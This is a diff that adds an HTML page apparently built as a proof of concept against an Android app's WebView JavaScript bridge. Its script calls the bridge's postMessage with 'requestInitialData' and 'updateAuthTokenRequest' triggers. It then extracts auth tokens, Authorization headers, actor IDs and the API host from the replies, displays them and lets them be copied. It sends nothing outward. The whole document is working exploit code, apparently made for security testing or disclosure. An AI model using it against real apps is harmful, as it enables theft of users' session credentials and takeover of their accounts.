@@ -1,0 +1,89 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>WebView bridge probe</title>
+<style>
+  body { font: 13px/1.45 ui-monospace, Menlo, Consolas, monospace; background: #0b0f14; color: #e6edf3; margin: 0; padding: 14px; }
+  h1 { font-size: 15px; color: #ff7b72; margin: 0 0 4px; }
+  h2 { font-size: 13px; color: #7d8590; margin: 16px 0 4px; text-transform: uppercase; letter-spacing: .06em; }
+  .box { background: #000; border: 1px solid #30363d; border-radius: 6px; padding: 8px; white-space: pre-wrap; word-break: break-all; }
+  .tok { color: #3fb950; }
+  .muted { color: #7d8590; }
+  button { background: #21262d; color: #e6edf3; border: 1px solid #30363d; border-radius: 6px; padding: 6px 10px; font: inherit; margin-top: 6px; }
+</style>
+</head>
+<body>
+<h1>Page served from this origin, inside the host app's WebView</h1>
+<div class="muted" id="origin">origin: </div>
+<div class="muted">This page only displays what the host app hands it. It sends nothing anywhere.</div>
+
+<h2>Bridge</h2>
+<div class="box" id="status">checking for window.androidParent &hellip;</div>
+
+<h2>Credential handed to this page</h2>
+<div class="box tok" id="cred">-</div>
+<button id="copy">copy</button>
+
+<h2>Bridge traffic</h2>
+<div class="box" id="traffic"></div>
+
+<script>
+(function () {
+  var statusEl = document.getElementById('status');
+  var credEl = document.getElementById('cred');
+  var trafficEl = document.getElementById('traffic');
+  document.getElementById('origin').textContent = 'origin: ' + window.location.origin;
+
+  function line(s) { trafficEl.textContent += s + '\n'; }
+
+  document.getElementById('copy').onclick = function () {
+    var t = document.createElement('textarea');
+    t.value = credEl.textContent;
+    document.body.appendChild(t); t.select();
+    try { document.execCommand('copy'); } catch (e) {}
+    document.body.removeChild(t);
+  };
+
+  window.addEventListener('message', function (e) {
+    var data = e.data;
+    if (typeof data === 'string') { try { data = JSON.parse(data); } catch (err) {} }
+    line('<<< ' + JSON.stringify(data));
+    var p = (data && data.payload) || {};
+    var token = (p.actor && p.actor.token) || p.token || null;
+    var headers = (p.api && p.api.headers) || {};
+    var auth = headers.Authorization || headers.authorization || null;
+    if (token || auth) {
+      credEl.textContent =
+        (token ? 'actor.token:   ' + token + '\n' : '') +
+        (auth ? 'Authorization: ' + auth + '\n' : '') +
+        (p.actor && p.actor.id ? 'actor.id:      ' + p.actor.id + '\n' : '') +
+        (p.actor && p.actor.drnId ? 'actor.drnId:   ' + p.actor.drnId + '\n' : '') +
+        (p.actor && p.actor.drnMarket ? 'drnMarket:     ' + p.actor.drnMarket + '\n' : '') +
+        (p.api && p.api.host ? 'api host:      ' + p.api.host : '');
+    }
+    statusEl.textContent = 'received trigger: ' + (data && data.trigger);
+  });
+
+  function call(trigger) {
+    try {
+      window.androidParent.postMessage(JSON.stringify({ trigger: trigger }));
+      line('>>> ' + trigger);
+    } catch (err) {
+      line('ERROR calling bridge: ' + err);
+    }
+  }
+
+  if (window.androidParent && typeof window.androidParent.postMessage === 'function') {
+    statusEl.textContent = 'window.androidParent is bound to this page';
+    call('requestInitialData');
+    setTimeout(function () { call('updateAuthTokenRequest'); }, 1500);
+  } else {
+    statusEl.textContent = 'no window.androidParent on this page (not loaded by the host WebView)';
+  }
+})();
+</script>
+</body>
+</html>
